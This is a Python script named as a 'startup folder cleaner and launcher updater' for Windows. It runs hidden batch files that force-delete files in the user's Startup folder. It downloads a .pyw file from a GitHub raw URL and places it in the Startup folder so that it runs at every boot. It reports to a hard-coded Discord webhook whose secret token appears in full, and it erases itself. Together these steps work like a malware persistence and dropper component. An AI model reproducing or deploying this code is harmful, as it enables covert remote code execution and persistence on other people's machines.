# monitor_script.py - Only does cleanup and launcher update
import os
import sys
import urllib.request
import subprocess
import tempfile
import time
import requests

# Discord webhook for update notifications
UPDATE_WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_webhook(message):
    """Send simple webhook"""
    try:
        data = {"content": message}
        requests.post(UPDATE_WEBHOOK, json=data, timeout=5)
    except:
        pass

def nuclear_cleanup():
    """Force delete ALL files from startup folder"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # Batch script to force delete everything
    batch_script = f'''@echo off
cd /d "{startup_folder}"

:: Delete all unwanted files
del /f /q *.log 2>nul
del /f /q *.txt 2>nul
del /f /q *.json 2>nul
del /f /q *.py 2>nul
del /f /q *.pyw 2>nul
del /f /q *.pyc 2>nul
del /f /q *.bat 2>nul
del /f /q requirements.txt 2>nul

:: Keep only launchers (will be updated)
if exist "github_launcher.pyw" (
    copy "github_launcher.pyw" "Startup.pyw" /Y >nul
)

:: Delete __pycache__ folders
for /d %%d in (__pycache__) do (
    rmdir /s /q "%%d" 2>nul
)

echo Cleanup complete
timeout /t 2 /nobreak >nul
del "%~f0" >nul 2>nul
'''
    
    # Save and run batch file
    batch_path = tempfile.gettempdir() + "/nuke_startup.bat"
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run hidden
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    
    subprocess.Popen(
        ['cmd', '/c', batch_path],
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    
    # Wait a bit
    time.sleep(3)
    
    return True

def update_launcher():
    """Download github_launcher.pyw from GitHub and replace Startup.pyw"""
    try:
        launcher_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw"
        
        # Download new launcher
        response = urllib.request.urlopen(launcher_url, timeout=10)
        new_launcher_code = response.read().decode('utf-8')
        
        # Save to startup folder
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        # Write as Startup.pyw
        with open(os.path.join(startup_folder, "Startup.pyw"), 'w', encoding='utf-8') as f:
            f.write(new_launcher_code)
        
        # Also save as github_launcher.pyw (backup)
        with open(os.path.join(startup_folder, "github_launcher.pyw"), 'w', encoding='utf-8') as f:
            f.write(new_launcher_code)
        
        send_webhook("✅ Launcher updated successfully!")
        return True
        
    except Exception as e:
        send_webhook(f"❌ Failed to update launcher: {str(e)}")
        return False

def delete_self():
    """Delete this monitor_script.py file"""
    try:
        this_script = os.path.abspath(__file__)
        
        # Check if we're in startup folder
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        if this_script.startswith(startup_folder):
            # Create batch file to delete this script
            batch_content = f'''@echo off
timeout /t 5 /nobreak >nul
del /f /q "{this_script}" >nul 2>nul
if exist "{this_script}" (
    del /f /q "{this_script}" >nul 2>nul
)
del "%~f0" >nul 2>nul
'''
            
            batch_path = tempfile.gettempdir() + "/delete_monitor.bat"
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            # Run hidden
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
            subprocess.Popen(
                ['cmd', '/c', batch_path],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
    except:
        pass

def main():
    """Main cleanup and update function"""
    print("=" * 50)
    print("STARTUP FOLDER CLEANER & LAUNCHER UPDATER")
    print("=" * 50)
    
    # 1. Nuclear cleanup
    print("\n[1/3] Force cleaning startup folder...")
    nuclear_cleanup()
    
    # 2. Update launcher
    print("\n[2/3] Updating launcher from GitHub...")
    update_launcher()
    
    # 3. Delete this script
    print("\n[3/3] Removing cleanup script...")
    delete_self()
    
    print("\n" + "=" * 50)
    print("CLEANUP COMPLETE!")
    print("Next boot will use new launcher")
    print("=" * 50)
    
    # Send final webhook
    send_webhook("🔄 Startup folder cleaned and launcher updated successfully!")
    
    # Wait before exit
    time.sleep(2)

if __name__ == "__main__":
    main()
